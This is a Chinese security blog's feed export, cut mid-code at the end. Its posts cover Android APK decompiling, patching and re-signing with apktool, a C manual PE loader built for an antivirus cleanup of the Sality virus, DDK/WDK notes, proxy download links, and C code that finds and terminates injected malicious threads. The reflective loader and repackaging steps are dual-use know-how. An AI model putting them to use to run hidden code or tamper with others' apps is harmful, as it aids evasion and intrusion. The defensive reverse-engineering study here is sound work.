Landroid/widget/TextView;-&gt;setText(Ljava/lang/CharSequence;)V    .line 35    const-string v5, &quot;Success!&quot;    invoke-virtual {v1, v5}, Landroid/widget/TextView;-&gt;setText(Ljava/lang/CharSequence;)V    goto :goto_1    .line 39    :cond_1    const-string v5, &quot;\u9519\u8bef\uff0c\u8bf7\u91cd\u8bd5\uff01&quot;    invoke-virtual {v0, v5}, Landroid/widget/TextView;-&gt;setText(Ljava/lang/CharSequence;)V    .line 40    invoke-virtual {v1, v4}, Landroid/widget/TextView;-&gt;setText(Ljava/lang/CharSequence;)V    .line 42    :goto_1    return-void.end method.method protected onCreate(Landroid/os/Bundle;)V    .locals 1    .param p1, &quot;savedInstanceState&quot;    # Landroid/os/Bundle;    .line 15    invoke-super {p0, p1}, Landroidx/appcompat/app/AppCompatActivity;-&gt;onCreate(Landroid/os/Bundle;)V    .line 16    #这里给到的是资源布局文件的编号，去找到这个值对应的资源文件就行    const v0, 0x7f0a001c    #setContentView(R.layout.activity_main);    invoke-virtual {p0, v0}, Lcom/Crat/changeme/MainActivity;-&gt;setContentView(I)V    .line 17    return-void.end method</code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>Android逆向</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Android逆向原理 一</title>
    <link href="/cray/2019/12/14/android%E9%80%86%E5%90%91%E4%B8%80/"/>
    <url>/cray/2019/12/14/android%E9%80%86%E5%90%91%E4%B8%80/</url>
    
    <content type="html"><![CDATA[<h2 id="一套流程概述"><a href="#一套流程概述" class="headerlink" title="一套流程概述"></a>一套流程概述</h2><p>使用<code>jadx</code>反编译后找到修改的文件，通过<code>apktool</code>反编<code>apk</code>文件后，在文件中找到对应的<code>smail文件</code>，修改后使用<code>apktool</code>回编，然后再用<code>jarsigner</code> 签名生成的apk</p><h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2><p>apk本身可以使用压缩软件打开，打开后的目录</p><p><img src="https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191214115813.png" srcset="/cray/img/loading.gif" alt="20191214115813.png"></p><p>这样打开的文件结构肯定是查看不完整的，很多二进制文件也不能解析</p><h2 id="反编译APK"><a href="#反编译APK" class="headerlink" title="反编译APK"></a>反编译APK</h2><p><strong>apktool:逆向apk工具集</strong></p><p><strong>jadx：用于从Android Dex和Apk文件生成Java源代码的命令行和GUI工具</strong></p><p><strong>AndroidKiller：和jadx一样，还可以直接修改smail语句后回编APK以及添加签名</strong></p><p>使用apk反编译工具<code>apktool</code>,这里不推荐用<code>AndroidKiller</code>了</p><p>虽然他的反编很方便，但是连我的<code>Android studio</code>的Hello world程序都反编译不了，表示劝退好吧，而且也存在很多Bug</p><p>这里不得不安利一个超级好用的软件<code>jadx</code>，具体优点如下，使用方法也比较简单，去混淆的设置是真的好</p><p><a href="https://segmentfault.com/a/1190000012180752" target="_blank" rel="noopener">jadx介绍</a></p><h3 id="第一步jadx反编译"><a href="#第一步jadx反编译" class="headerlink" title="第一步jadx反编译"></a>第一步jadx反编译</h3><p>我用jadx的目的是找到需要修改的具体文本，以及修改思路</p><h3 id="修改后的值"><a href="#修改后的值" class="headerlink" title="修改后的值"></a>修改后的值</h3><p>apktool 反编出smali<br>使用命令</p><p><code>apktool d [apk_path]</code></p><p>就可以在apk目录下创建一个文件夹</p><p>对apk的所有修改都是对这个文件夹中内容进行修改</p><h3 id="重新回编译"><a href="#重新回编译" class="headerlink" title="重新回编译"></a>重新回编译</h3><p>apktool 回编成apk</p><p>使用命令</p><p><code>apktool b [apk_folder_path]</code></p><p><strong>将会在这个文件夹下生成一个dist夹，其中就有回编的apk文件</strong></p><p>apktool回编的时候经常出现文件夹占用，可以使用<br><code>apktool empty-framework-dir --force</code>  清空一下历史文件夹</p><h3 id="文件重签名"><a href="#文件重签名" class="headerlink" title="文件重签名"></a>文件重签名</h3><p>注意上面生成的文件还不能安装，没有签名信息，安装会失败</p><p>如果是第一次使用签名，需要先生成一个,<code>keytool</code>一般的<code>JAVA</code>环境都自带</p><pre><code>格式keytool -genkeypair -keystore 密钥库名 -alias 密钥别名 -validity 天数 -keyalg RSA参数:    -genkeypair  生成一条密钥对(由私钥和公钥组成)    -keystore    密钥库名字以及存储位置(默认当前目录)    -alias       密钥对的别名(密钥库可以存在多个密钥对,用于区分不同密钥对)    -validity    密钥对的有效期(单位: 天)    -keyalg      生成密钥对的算法(常用RSA/DSA,DSA只用于签名,默认采用DSA)    -delete      删除一条密钥提示: 可重复使用此条命令,在同一密钥库中创建多条密钥对例如:         在debug.keystore中新增一对密钥,别名是release    keytool -genkeypair -keystore debug.keystore -alias release -validity 30000</code></pre><p>生成好后就可以使用这个签名文件进行签名了</p><pre><code>jarsigner -keystore 密钥库名 xxx.apk 密钥别名参数:    -digestalg  摘要算法    -sigalg     签名算法例如:    用JDK7及以上jarsigner签名,不支持Android 4.2 以下    jarsigner -keystore debug.keystore MyApp.apk release    用JDK7及以上jarsigner签名,兼容Android 4.2 以下                jarsigner -keystore debug.keystore -digestalg SHA1 -sigalg SHA1withRSA MyApp.apk androiddebugkey</code></pre><p>签名就OK，剩下安装测试就行了</p><p>参考</p><p><a href="https://www.jianshu.com/p/53078d03c9bf" target="_blank" rel="noopener">https://www.jianshu.com/p/53078d03c9bf</a></p><p><a href="https://blog.csdn.net/dreamer2020/article/details/52761606" target="_blank" rel="noopener">https://blog.csdn.net/dreamer2020/article/details/52761606</a></p><p><a href="https://ibotpeaches.github.io/Apktool/" target="_blank" rel="noopener">https://ibotpeaches.github.io/Apktool/</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Android逆向</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一个数据统计公司</title>
    <link href="/cray/2019/12/10/%E6%95%B0%E6%8D%AE%E7%BB%9F%E8%AE%A1%E7%BD%91%E7%AB%99/"/>
    <url>/cray/2019/12/10/%E6%95%B0%E6%8D%AE%E7%BB%9F%E8%AE%A1%E7%BD%91%E7%AB%99/</url>
    
    <content type="html"><![CDATA[<p>数据是无价的，这里给一个可以查看目前操作系统，浏览器，搜索引擎等等的使用比例</p><h2 id="最受欢迎的操作系统"><a href="#最受欢迎的操作系统" class="headerlink" title="最受欢迎的操作系统"></a>最受欢迎的操作系统</h2><p><img src="https://cdn.jsdelivr.net/gh/L0yy/tuchuang/Img/20191211143848.png" srcset="/cray/img/loading.gif" alt="20191211143848.png"></p><p><code>windows</code> 毫不意外的以<code>87%</code>的份额获得了第一</p><h2 id="最受欢迎的搜索引擎"><a href="#最受欢迎的搜索引擎" class="headerlink" title="最受欢迎的搜索引擎"></a>最受欢迎的搜索引擎</h2><p><img src="https://cdn.jsdelivr.net/gh/L0yy/tuchuang/Img/20191211144118.png" srcset="/cray/img/loading.gif" alt="20191211144118.png"></p><p>百度能这么多也基本都是国内的资源</p><p>以上数据全来源<a href="https://www.netmarketshare.com/" target="_blank" rel="noopener">netmarketshare</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>其他</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>简单PE加载器</title>
    <link href="/cray/2019/12/07/%E7%AE%80%E5%8D%95PE%E5%8A%A0%E8%BD%BD%E5%99%A8/"/>
    <url>/cray/2019/12/07/%E7%AE%80%E5%8D%95PE%E5%8A%A0%E8%BD%BD%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<p>思路来源写<code>Sality</code>感染型病毒专杀时指令被严重混淆，通过加载PE 修改内存 跑一下解密算法效率是最高的。</p><p>很多病毒在运行的时候都会加载另一个主映像文件去执行，而不是创建进程，就很有意思</p><p>下面就是如何加载一个PE，再展开，最后修复执行的过程 </p><p>该函数主要是为了将文件映射到内存中，保证源程序安全</p><p>返回值是未展开文件在内存中的位置</p><pre><code class="C">LPBYTE LoadFileToMem(LPCSTR lpFilePath){    //////////////////////////////////////////////////////////////////////////    ////将源文件读到内存中                                                  ///    //////////////////////////////////////////////////////////////////////////    DWORD FileSize = 0;    LPBYTE Buff = NULL;    HANDLE hFile = CreateFileA(lpFilePath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);    if (hFile == INVALID_HANDLE_VALUE)    {        printf(&quot;打开文件句柄错误！[%x]&quot;, GetLastError());        return -1;    }    FileSize = GetFileSize(hFile, NULL);    Buff = (LPBYTE)malloc(FileSize);    if (Buff == NULL)    {        printf(&quot;空间申请失败![%x]&quot;, GetLastError());        return -1;    }    if (!ReadFile(hFile, Buff, FileSize, &amp;FileSize, NULL))    {        printf(&quot;ReadFile![%x]&quot;, GetLastError());        return -1;    }    return Buff;}</code></pre><p>接下来按照各个节的对齐粒度展开<br>返回值是展开后什么都没修复的buff指针</p><pre><code class="C">LPBYTE Extension(LPBYTE lpFileBuffer){    //////////////////////////////////////////////////////////////////////////    ////将文件在内存中展开                                                  ///    //////////////////////////////////////////////////////////////////////////    int i = 0;     PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpFileBuffer;    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(lpFileBuffer + pDos-&gt;e_lfanew);    PIMAGE_SECTION_HEADER pSec = (PIMAGE_SECTION_HEADER)((LPBYTE)pNt + sizeof(IMAGE_NT_HEADERS));    DWORD ImageSize = pNt-&gt;OptionalHeader.SizeOfImage;    //LPBYTE lpMemBuffer = (LPBYTE)malloc(ImageSize);    LPVOID lpMemBuffer = VirtualAlloc(NULL, ImageSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);    VirtualProtect(lpMemBuffer, ImageSize, PAGE_EXECUTE_READWRITE, NULL);//这一句可以不要，上面申请的就是可读可写可执行的空间。    ZeroMemory(lpMemBuffer, ImageSize);    //文件头的大小    DWORD dwSizeOfHeader = pNt-&gt;OptionalHeader.SizeOfHeaders;    //将头部拷贝过去    CopyMemory(lpMemBuffer, lpFileBuffer, dwSizeOfHeader);    for (;i &lt; pNt-&gt;FileHeader.NumberOfSections;i++)    {        if (pSec-&gt;VirtualAddress == 0 || pSec-&gt;PointerToRawData == 0)        {            pSec++;            continue;        }        CopyMemory((LPBYTE)lpMemBuffer + pSec-&gt;VirtualAddress, lpFileBuffer + pSec-&gt;PointerToRawData, pSec-&gt;SizeOfRawData);        pSec++;    }    //已经完全映射，可以把之前的内存释放掉了    free(lpFileBuffer);    return lpMemBuffer;}</code></pre><p>修复重定位信息</p><p>这一步容易出错，核心原理是重定位表中存的是这个程序需要修复的数据，每个数据都是<code>DWORD</code>类型的<br>可以参考如下地址，主要要注意 <code>pReloca-&gt;VirtualAddress</code>存的是页基质 , <code>pReloca-&gt;SizeOfBlock</code> 包含了<code>IMAGE_BASE_RELOCATION</code> 结构的大小<br><a href="https://blog.csdn.net/Apollon_krj/article/details/77370452" target="_blank" rel="noopener">https://blog.csdn.net/Apollon_krj/article/details/77370452</a></p><pre><code class="C">BOOL ReRloc(LPBYTE lpMemBuffer){    //////////////////////////////////////////////////////////////////////////    ////修复重定位表                                                       ///    ////原理：遍历重定位表，计算需要重定位数据的地址：重定位后的地址 = 需要重定位的地址 - 默认加载基址 + 当前加载基址    //////////////////////////////////////////////////////////////////////////    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpMemBuffer;    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(lpMemBuffer + pDos-&gt;e_lfanew);    //获得重定位表    PIMAGE_BASE_RELOCATION pReloca = (PIMAGE_BASE_RELOCATION)(lpMemBuffer + pNt-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);    //如果重定位表为空，上述表达式为pDos+0    if ((LPBYTE)pReloca == lpMemBuffer)    {        printf(&quot;没有重定位表！\n&quot;);        return TRUE;    }    while (pReloca-&gt;VirtualAddress !=0 &amp;&amp; pReloca-&gt;SizeOfBlock !=0 )    {        LPWORD pRelData =  (LPBYTE)pReloca + sizeof(IMAGE_BASE_RELOCATION);        int nNumRel = (pReloca-&gt;SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);        for (int i = 0; i &lt; nNumRel; i++)        {            // 每个WORD由两部分组成。高4位指出了重定位的类型，WINNT.H中的一系列IMAGE_REL_BASED_xxx定义了重定位类型的取值。            // 低12位是相对于VirtualAddress域的偏移，指出了必须进行重定位的位置。            if ((WORD)(pRelData[i] &amp; 0xF000) == 0x3000) //这是一个需要修正的地址            {                //pReloca-&gt;VirtualAddress存的是页基质，(一个页4K，所以是0xFFF，刚好12位)                LPDWORD pAddress = (LPDWORD)(lpMemBuffer + pReloca-&gt;VirtualAddress + (pRelData[i] &amp; 0x0FFF));                *pAddress = *pAddress - pNt-&gt;OptionalHeader.ImageBase + (DWORD)pDos;                printf(&quot;Check!&quot;);                //DWORD dwDelta = (DWORD)pDos - pNt-&gt;OptionalHeader.ImageBase;                //*pAddress += dwDelta;            }        }        pReloca = (LPBYTE)pReloca + pReloca-&gt;SizeOfBlock;    }    printf(&quot;重定位表修复完成！\n&quot;);    return TRUE;}</code></pre><p>修复IAT 这一步也是必须的，在很多壳中是对IAT表进行了Hook，了解一下结构</p><p><code>WinNt.h</code>中定义的<code>IMAGE_IMPORT_DESCRIPTOR</code>结构</p><pre><code class="C">typedef struct _IMAGE_IMPORT_DESCRIPTOR {    union {                                 //注意这是union        DWORD   Characteristics;            // 0 for terminating null import descriptor        DWORD   OriginalFirstThunk;         // RVA to original unbound IAT (PIMAGE_THUNK_DATA)    } DUMMYUNIONNAME;    DWORD   TimeDateStamp;                  // 0 if not bound,                                            // -1 if bound, and real date\time stamp                                            //     in IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT (new BIND)                                            // O.W. date/time stamp of DLL bound to (Old BIND)    DWORD   ForwarderChain;                 // -1 if no forwarders    DWORD   Name;    DWORD   FirstThunk;                     // RVA to IAT (if bound this IAT has actual addresses)} IMAGE_IMPORT_DESCRIPTOR;typedef IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR;</code></pre><p><code>OriginalFirstThunk</code> 和 <code>FirstThunk</code> 都指向一个 <code>IMAGE_THUNK_DATA32</code> 结构，该结构是以<code>0</code> 结尾</p><p><code>OriginalFirstThunk</code> 是一直不会被修改，程序构建好后就固定 INT<br><code>FirstThunk</code> 在程序加载时动态修改为具体的函数地址，也就是我们常说的IAT</p><pre><code class="C">typedef struct _IMAGE_THUNK_DATA32 {    union {        DWORD ForwarderString;      // PBYTE         DWORD Function;             // PDWORD        DWORD Ordinal;        DWORD AddressOfData;        // PIMAGE_IMPORT_BY_NAME    } u1;} IMAGE_THUNK_DATA32;typedef IMAGE_THUNK_DATA32 * PIMAGE_THUNK_DATA32;</code></pre><p>根据Ordinal的值，判断是按序号导入还是按名称导入，如果是按名称导入则需要去<code>AddressOfData</code>指向的<code>IMAGE_IMPORT_BY_NAME</code>结构中去拿到导入函数名</p><pre><code class="C">typedef struct _IMAGE_IMPORT_BY_NAME {    WORD    Hint;    CHAR   Name[1];                 //保存具体导入函数的名称} IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;</code></pre><p>如果是序号导入就根据<code>Ordinal</code>的<code>低16</code>位决定</p><p><a href="https://www.cnblogs.com/night-ride-depart/p/5776107.html" target="_blank" rel="noopener">https://www.cnblogs.com/night-ride-depart/p/5776107.html</a></p><pre><code class="C">BOOL InitIAT(LPBYTE lpMemBuffer){    //////////////////////////////////////////////////////////////////////////    ////修复IAT                                                                //////////////////////////////////////////////////////////////////////////    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpMemBuffer;    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(lpMemBuffer + pDos-&gt;e_lfanew);    PIMAGE_IMPORT_DESCRIPTOR pImportTalbe = (PIMAGE_IMPORT_DESCRIPTOR)(lpMemBuffer + pNt-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);    LPCSTR szDllname = NULL;    PIMAGE_THUNK_DATA lpOrgNameArry = NULL;    PIMAGE_THUNK_DATA lpFirNameArry = NULL;    PIMAGE_IMPORT_BY_NAME lpImportByNameTable = NULL;    HMODULE hMou;    FARPROC Funaddr;    int i = 0;    while (pImportTalbe-&gt;OriginalFirstThunk)    {        szDllname = lpMemBuffer + pImportTalbe-&gt;Name;        hMou = GetModuleHandleA(szDllname);        if (hMou == NULL)        {            hMou = LoadLibraryA(szDllname);            if (hMou == NULL)            {                printf(&quot;加载%s失败！[%x]\n &quot;, szDllname, GetLastError());                return FALSE;            }        }        //dll加载成功，开始导入需要的函数        lpOrgNameArry = (PIMAGE_THUNK_DATA)(lpMemBuffer + pImportTalbe-&gt;OriginalFirstThunk);        lpFirNameArry = (PIMAGE_THUNK_DATA)(lpMemBuffer + pImportTalbe-&gt;FirstThunk);        i = 0;        while (lpOrgNameArry[i].u1.AddressOfData)        {            lpImportByNameTable = (PIMAGE_IMPORT_BY_NAME)(lpMemBuffer + lpOrgNameArry[i].u1.AddressOfData);            if (lpOrgNameArry[i].u1.Ordinal &amp; 0x80000000 == 1)            {                //序号导入                Funaddr = GetProcAddress(hMou, (LPSTR)(lpOrgNameArry[i].u1.Ordinal &amp; 0xFFFF));            }            else            {                //名称导入                Funaddr = GetProcAddress(hMou, lpImportByNameTable-&gt;Name);            }            lpFirNameArry[i].u1.Function = Funaddr;            i++;        }        pImportTalbe++;    }    return TRUE;}</code></pre><p>最后就是修复<code>ImageBase</code></p><pre><code class="C">FARPROC InitEnv(LPBYTE lpMemBuffer){    //////////////////////////////////////////////////////////////////////////    ////修改ImageBase，返回入口点                                           ///    //////////////////////////////////////////////////////////////////////////    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpMemBuffer;    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(lpMemBuffer + pDos-&gt;e_lfanew);    pNt-&gt;OptionalHeader.ImageBase = lpMemBuffer;    return lpMemBuffer + pNt-&gt;OptionalHeader.AddressOfEntryPoint;}</code></pre><p>返回这个被加载程序的入口地址，直接调用就好</p><p>吃水不忘挖井人 参考来源<br><a href="https://bbs.pediy.com/thread-249133.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-249133.htm</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>逆向</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DDK与WDK WDM的区别</title>
    <link href="/cray/2019/11/18/DDK%E4%B8%8EWDK%20WDM%E7%9A%84%E5%8C%BA%E5%88%AB/"/>
    <url>/cray/2019/11/18/DDK%E4%B8%8EWDK%20WDM%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
    
    <content type="html"><![CDATA[<p>自己总结如下：</p><p><img src="https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191216121033.png" srcset="/cray/img/loading.gif" alt="20191216121033.png"></p><p><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6d/Windows_Updated_Family_Tree.png/1920px-Windows_Updated_Family_Tree.png" srcset="/cray/img/loading.gif" alt="image.png"></p><p>转载自：<a href="http://blog.sina.com.cn/s/blog_4b9eab320101b6yn.html" target="_blank" rel="noopener">http://blog.sina.com.cn/s/blog_4b9eab320101b6yn.html</a></p><p>1.首先，先从基础的东西说起，开发WINDOWS下的驱动程序，需要一个专门的开发包，如：开发JAVA程序，我们可能需要一个JDK，开发WINDOWS应用程序，我们需要WINDOWS的SDK，现在开发WINDOWS下的驱动程序，我们需要一个DDK/WDK。</p><p>2.DDK（Driver Developer Kit）和WDK（Windows Driver Kit）的区别：</p><p>这个要说说驱动相关的一些历史:</p><pre><code>1).95/98/ME下，驱动模型为：Vxd，相关资料可以看《编程高手箴言》的前几个章节，里面有很详细的介绍，虽然这个东西已经过时，但大概看看还是会增长见识的。2).2000/XP/2003下，Windows采用WDM驱动模型（Windows Driver Model），开发2000/XP/2003的驱动开发包为：DDK。WDM驱动无非是微软在NT式驱动之上进行了扩充，过滤驱动也不例外 。3).Vista及以后版本，采用了WDF驱动模型（Windows Driver Foudation），对应的开发包：WDK。</code></pre><p>其实<strong>WDK可以看做是DDK的升级版本，现在一般的WDK是包含以前DDK相关的功能，现在XP下也可以用WDK开发驱动，WDK能编译出2000-2008的各种驱动</strong>。</p><p>3.Vxd驱动文件扩展名为：.vxd。</p><p>WDM和WDF驱动文件扩展名为：.sys。</p><p>4、WDM 是 Win32设备驱动程序体系结构。</p><p>件驱动的驱动程序开发框架，大大降低了开发难度。从现在开始，掌握Windows设备驱动程序的开发人员，由过去的“专业”人士，将变为“普通”大众。</p><p>WDF驱动程序包括两个类型，一个是内核级的，称为KMDF（Kernel-Mode Driver Framework），为SYS文件；另一个是用户级的，称为UMDF（User-Mode Driver Framework），为DLL文件。</p><p>5、DDK 和WDK</p><p><strong>DDK是基于wdm驱动模型的，而WDK是基于WDF驱动模型的</strong>，wdm驱动模型和wdf驱动模型的最大的区别是：</p><pre><code>1)wdf驱动框架对WDM进行了一次封装，WDF框架就好像C++中的基类一样，且这个基类中的model,IO model ,pnp和电源管理模型;且提供了一些与操作系统相关的处理函数，这些函数好像C++中的虚函数一样，WDF驱动中能够对这些函数进行override；特别是Pnp管理和电源管理！基本上都由WDF框架做了，而WDF的功能驱动几乎不要对它进行特殊的处理；2)WDF驱动模型 与WDM驱动模型的另外一个主要区别是：WDF 驱动采用队列进行IO处理，而WDM中将所有的IO操作都用默认的队列进行处理，如果要进行IRp同步，必须使用StartIO；3)WDF是面向对象的，而WDM是面向过程的，WDF提供对象的封装，如将IRP封装成WDFREQUEST，对象提供方法和Event。5）usb设备的读写；当应用程序使用ReadFile或WriteFile进行读写时，首先将UsbBuildInterruptOrBulkTransferRequest将构建urb请求，然后通过IoCallDriver发送给底层usb 总线驱动；对于WDF来说，WdfUsbTargetPipeFormatRequestForRead 格式化读请求，然后使用WdfRequestSend  发送给底层Usb总线驱动；对WDM和WDF的usb的读写都可以设置完成例程；</code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>内核</tag>
      
      <tag>驱动学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PC及安卓翻墙</title>
    <link href="/cray/2019/11/09/%E6%A2%AF%E5%AD%90/"/>
    <url>/cray/2019/11/09/%E6%A2%AF%E5%AD%90/</url>
    
    <content type="html"><![CDATA[<p>之前写过一篇，但是效果不太理想，现在再总结一下使用中的常见问题</p><p>这是我随意打开的Youtube，连接速度达到了 1M/s  1080是没什么问题了</p><p>PC端</p><p><img src="https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191216121217.png" srcset="/cray/img/loading.gif" alt="20191216121217.png"></p><p>手机端<br><img src="https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191216121241.png" srcset="/cray/img/loading.gif" alt="20191216121241.png"></p><p>各版本下载链接(这些在github上都是开源的，不放心可以自己去找源码编译)</p><p><a href="http://files.huaduo.icu/shadowsocksr/" target="_blank" rel="noopener">http://files.huaduo.icu/shadowsocksr/</a></p><h2 id="PC安装与使用"><a href="#PC安装与使用" class="headerlink" title="PC安装与使用"></a>PC安装与使用</h2>]]></content>
    
    
    
    <tags>
      
      <tag>防火墙</tag>
      
      <tag>代理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>恶意线程清理</title>
    <link href="/cray/2019/11/07/%E7%9B%91%E6%8E%A7%E7%BA%BF%E7%A8%8B/"/>
    <url>/cray/2019/11/07/%E7%9B%91%E6%8E%A7%E7%BA%BF%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<p>这篇博客的背景是：如果很多进程都恶意程序通过远进程注入了线程，那么应该怎么清除呢？</p><p>下面给出两种方法</p><h2 id="PLAN-A"><a href="#PLAN-A" class="headerlink" title="PLAN A"></a>PLAN A</h2><p>来自 加号</p><p>通过遍历线程后，根据获取到的线程信息，对线程地址和入口代码进行检查，这种方式适合对注入代码偏移位置固定或则入口代码固定，能准确查杀，推荐使用</p><pre><code class="C">void Killing::KillMalRemoteThread(){    (FARPROC&amp;)ZwQueryInformationThread = GetProcAddress(m_hNtdll, &quot;ZwQueryInformationThread&quot;);    HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);    THREADENTRY32 te32;    te32.dwSize = sizeof(THREADENTRY32);    Thread32First(hThreadSnap, &amp;te32);    HANDLE hThread;    do {        hThread = OpenThread(THREAD_ALL_ACCESS, false, te32.th32ThreadID);        setlocale(LC_ALL, &quot;.ACP&quot;);        DWORD startAddr;        ZwQueryInformationThread(hThread, ThreadQuerySetWin32StartAddress, &amp;startAddr, sizeof(PVOID), NULL);        printf(&quot;进程 %d, 线程 %d, 入口地址 0x%x\n&quot;, te32.th32OwnerProcessID, te32.th32ThreadID, startAddr);        if (startAddr &gt; 0x400000 &amp;&amp; startAddr &lt; 0x80000000)        {            if ((startAddr &amp; 0xFFFF) == 0x3A72 || (startAddr &amp; 0xFFFF) == 0x36F4)//判断进程入口地址2字节            {                PBYTE pbMapBase = (PBYTE)((startAddr &amp; 0xFFFF) == 0x3A72 ? startAddr - 0x3A72 : startAddr - 0x36F4);                HANDLE hOwnerProc = OpenProcess(PROCESS_VM_READ, false, te32.th32OwnerProcessID);                BYTE sectionOff_0[4] = { 0 };                BYTE sectionOff_2F8[5] = { 0 };                ReadProcessMemory(hOwnerProc, pbMapBase, sectionOff_0, 4, NULL);                ReadProcessMemory(hOwnerProc, pbMapBase + 0x2F8, sectionOff_2F8, 5, NULL);                if (*(DWORD*)&amp; sectionOff_0 == 0xFF243C83 &amp;&amp;                    *(DWORD*)&amp; sectionOff_2F8 == 0x00012DE9 &amp;&amp;                    sectionOff_2F8[4] == 0x00)//进一步检查入口代码是否为特定值                {                    printf(&quot;########\n恶意线程，在进程 %d, 线程 %d, 入口地址 0x%x\n&quot;, te32.th32OwnerProcessID, te32.th32ThreadID, startAddr);                    if (TerminateThread(hThread, -1))                    {                        printf(&quot;已终止该线程\n&quot;);                    }                    printf(&quot;########\n&quot;);                }            }        }        CloseHandle(hThread);    } while (Thread32Next(hThreadSnap, &amp;te32));    CloseHandle(hThreadSnap);}</code></pre><h2 id="PLAN-B"><a href="#PLAN-B" class="headerlink" title="PLAN B"></a>PLAN B</h2><p>而这个方案就比较猛一些，可以直接干掉所有不在模块中的线程，要小心一点</p><p>因为普通线程创建都会在进程的已知模块中，而恶意代码创建的就是不属于任何模块，也可以用过指定模块名来关闭线程</p><pre><code class="C">void WINAPI ClearThread(){    int Flag = 3;    while (Flag)    {        Sleep(1000);        HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);    // 进程快照句柄        PROCESSENTRY32 process = { sizeof(PROCESSENTRY32) };                        // 进程快照信息        // 遍历进程        while (Process32Next(hProcessSnap, &amp;process))        th32ProcessID{            HANDLE hThreadSnap = INVALID_HANDLE_VALUE;            // 线程快照句柄             THREADENTRY32 te32;                                    // 线程快照信息            // 创建线程快照            hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);            if (hThreadSnap == INVALID_HANDLE_VALUE) { printf(&quot;创建线程快照失败&quot;); }            // 为快照分派内存空间            te32.dwSize = sizeof(THREADENTRY32);            // 获取第一个线程的信息            if (!Thread32First(hThreadSnap, &amp;te32)) { printf(&quot;线程信息获取失败&quot;); }            // 遍历线程            while (Thread32Next(hThreadSnap, &amp;te32))            {                if (te32.th32OwnerProcessID == process.th32ProcessID)                {                    // 打开线程                    //printf(&quot;PID=%d, TID=%d\n&quot;,te32.th32OwnerProcessID,te32.th32ThreadID);                    HANDLE hThread = ::OpenThread(                        THREAD_ALL_ACCESS,        // 访问权限，THREAD_ALL_ACCESS ：所有权限                        FALSE,                    // 由此线程创建的进程不继承线程的句柄                        te32.th32ThreadID        // 线程 ID                        );                    if (hThread == NULL)                     {                         //printf(&quot;线程打开失败%x\n&quot;, GetLastError());                         continue;                     }                    // 将区域设置设置为从操作系统获取的ANSI代码页                    setlocale(LC_ALL, &quot;.ACP&quot;);                    // 获取 ntdll.dll 的模块句柄                    HINSTANCE hNTDLL = ::GetModuleHandleA(&quot;ntdll&quot;);                    // 从 ntdll.dll 中取出 ZwQueryInformationThread                    (FARPROC&amp;)ZwQueryInformationThread = ::GetProcAddress(hNTDLL, &quot;ZwQueryInformationThread&quot;);                    // 获取线程入口地址                    PVOID startaddr;                        // 用来接收线程入口地址                    ZwQueryInformationThread(                        hThread,                            // 线程句柄                        ThreadQuerySetWin32StartAddress,    // 线程信息类型，ThreadQuerySetWin32StartAddress ：线程入口地址                        &amp;startaddr,                            // 指向缓冲区的指针                        sizeof(startaddr),                    // 缓冲区的大小                        NULL                        );                    // 获取线程所在模块                    THREAD_BASIC_INFORMATION tbi;            // _THREAD_BASIC_INFORMATION 结构体对象                    TCHAR modname[MAX_PATH];                // 用来接收模块全路径                    ZwQueryInformationThread(                        hThread,                            // 线程句柄                        ThreadBasicInformation,                // 线程信息类型，ThreadBasicInformation ：线程基本信息                        &amp;tbi,                                // 指向缓冲区的指针                        sizeof(tbi),                        // 缓冲区的大小                        NULL                        );                    // 检查入口地址是否位于某模块中                    GetMappedFileName(                        ::OpenProcess(                        // 进程句柄                        PROCESS_ALL_ACCESS,                                    // 访问权限，THREAD_ALL_ACCESS ：所有权限                        FALSE,                                                // 由此线程创建的进程不继承线程的句柄                        (DWORD)tbi.ClientId.UniqueProcess                    // 唯一进程 ID                        ),                        startaddr,                            // 要检查的地址                        modname,                            // 用来接收模块名的指针                        MAX_PATH                            // 缓冲区大小                        );                    // 